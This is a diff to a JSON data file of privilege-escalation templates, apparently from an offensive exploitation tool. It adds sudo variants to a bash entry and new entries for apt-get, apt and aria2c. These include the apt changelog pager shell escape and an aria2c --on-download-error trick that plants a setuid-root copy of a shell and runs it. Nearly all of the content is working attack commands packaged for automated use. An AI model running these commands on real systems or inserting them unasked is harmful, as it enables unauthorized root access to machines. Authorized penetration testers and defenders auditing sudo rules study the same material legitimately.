@@ -1,12 +1,44 @@
 [
 	{
 		"name": "bash",
-		"shell": "{path} -p", 
+		"shell": "{sudo_prefix} {path} -p", 
+		"sudo": "{sudo_prefix} {command}",
 		"read_file": "{path} -p -c \"cat {lfile}\"",
 		"write_file": {
 			"type": "base64",
 			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
 		},
 		"command": "{path} -p -c {command}"
+	},
+	{
+		"name": "apt-get",
+		"shell": {
+			"enter": "{path} changelog apt",
+			"input": "!{shell}\n",
+			"exit": "exit\nq\n"
+		},
+		"sudo": {
+			"enter": "{sudo_prefix} {command} changelog apt",
+			"input": "!{shell}\n",
+			"exit": "exit\nq\n"
+		}
+	},
+	{
+		"name": "apt",
+		"shell": {
+			"enter": "{path} changelog apt",
+			"input": "!{shell}\n",
+			"exit": "exit\nq\n"
+		},
+		"sudo": {
+			"enter": "{sudo_prefix} {command} changelog apt",
+			"input": "!{shell}\n",
+			"exit": "exit\nq\n"
+		}
+	},
+	{
+		"name": "aria2c",
+		"shell": "TF=$(mktemp); SHELL=$(mktemp); cp {shell} $SHELL; echo \"chown root:root $SHELL; chmod +sx $SHELL;\" > $TF;chmod +x $TF; {path} --on-download-error=$TF http://x; sleep 1; $SHELL -p",
+		"sudo": "TF=$(mktemp); SHELL=$(mktemp); cp {shell} $SHELL; echo \"chown root:root $SHELL; chmod +sx $SHELL\" > $TF;chmod +x $TF; {sudo_prefix} {command} --on-download-error=$TF http://x; sleep 1; $SHELL -p"
 	}
 ]
